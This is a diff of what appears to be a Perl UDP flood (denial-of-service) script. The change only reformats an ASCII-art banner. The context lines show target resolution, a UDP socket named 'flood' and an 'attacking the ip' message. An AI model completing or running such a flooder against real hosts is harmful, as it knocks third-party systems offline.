@@ -14,10 +14,11 @@ $iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
 $endtime = time() + ($time ? $time : 100);
 socket(flood, PF_INET, SOCK_DGRAM, 17);
  
-print <<EOTEXT; 
  
- 
-                .  ....                  .,               
+print <<EOTEXT;   
+	   
+	   
+	                   .  ....                  .,               
             .',,,,,,,;;;.              '0Oo              
             .',,'.   ',,.             o00Od              
               .''. .                 '0O00.              
@@ -40,11 +41,10 @@ print <<EOTEXT;
       .,'   .,:;;.      .;;;:              
            .,;;;.       .,;;.              
           .,;;;          ';;:              
-         ';:;;,          .':;;;,.               
- 
-
- 
-EOTEXT 
+         ';:;;,          .':;;;,.     
+		 
+		 
+EOTEXT
      
 print "~You are attacking the ip: $ip " . ($port ? $port : "random") . " With " .
 ($size ? "$size-byte" : "Smacked With A Large Packets?") . " " .
